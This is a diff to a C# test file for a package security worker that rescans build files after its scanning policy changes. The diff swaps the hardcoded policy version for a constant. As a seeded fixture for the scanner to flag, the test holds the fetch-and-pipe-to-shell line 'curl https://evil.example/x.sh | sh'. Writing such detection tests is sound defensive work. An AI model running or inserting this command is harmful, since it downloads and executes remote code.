@@ -168,7 +168,7 @@ public class PackageSecurityWorkerTests
         // Seed packages with revision content
         await SeedAsync(repo, securityRepo, "legacy-clean", "pkgname=legacy-clean\npkgver=1.0\n");
         await SeedAsync(repo, securityRepo, "v1-evil", "curl https://evil.example/x.sh | sh\n");
-        await SeedAsync(repo, securityRepo, "v2-clean", "pkgname=v2-clean\npkgver=1.0\n");
+        await SeedAsync(repo, securityRepo, "current-clean", "pkgname=current-clean\npkgver=1.0\n");
 
         // Simulate legacy scan (version 1) on legacy-clean and v1-evil
         _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1));
@@ -176,7 +176,7 @@ public class PackageSecurityWorkerTests
         _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1));
         await securityRepo.CompleteScanAsync("v1-evil", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 1); // was incorrectly verified in v1
         _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1));
-        await securityRepo.CompleteScanAsync("v2-clean", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 2); // already v2
+        await securityRepo.CompleteScanAsync("current-clean", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion); // already current
 
         var status = new SecurityScanStatusStore(true);
         var worker = CreateWorker(repo, securityRepo, status);
@@ -184,18 +184,23 @@ public class PackageSecurityWorkerTests
         await worker.StartAsync(CancellationToken.None);
 
         // Wait for rescans
-        var scan1 = await WaitForScanAsync(securityRepo, "legacy-clean", expectedPolicyVersion: 2);
-        var scan2 = await WaitForScanAsync(securityRepo, "v1-evil", expectedPolicyVersion: 2);
+        var scan1 = await WaitForScanAsync(securityRepo, "legacy-clean", expectedPolicyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion);
+        var scan2 = await WaitForScanAsync(securityRepo, "v1-evil", expectedPolicyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion);
         await worker.StopAsync(CancellationToken.None);
+
+        var current = await securityRepo.GetAsync("current-clean", "rev-1");
 
         Assert.Multiple(() =>
         {
             Assert.That(scan1.Status, Is.EqualTo(SecurityStatus.Verified));
-            Assert.That(scan1.PolicyVersion, Is.EqualTo(2));
+            Assert.That(scan1.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion));
 
             Assert.That(scan2.Status, Is.EqualTo(SecurityStatus.Flagged));
-            Assert.That(scan2.PolicyVersion, Is.EqualTo(2));
+            Assert.That(scan2.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion));
             Assert.That(scan2.Findings, Is.Not.Empty);
+
+            Assert.That(current!.Status, Is.EqualTo(SecurityStatus.Verified));
+            Assert.That(current.PolicyVersion, Is.EqualTo(PkgBuildSecurityScanner.CurrentPolicyVersion), "current-policy scan is not requeued");
         });
     }
 
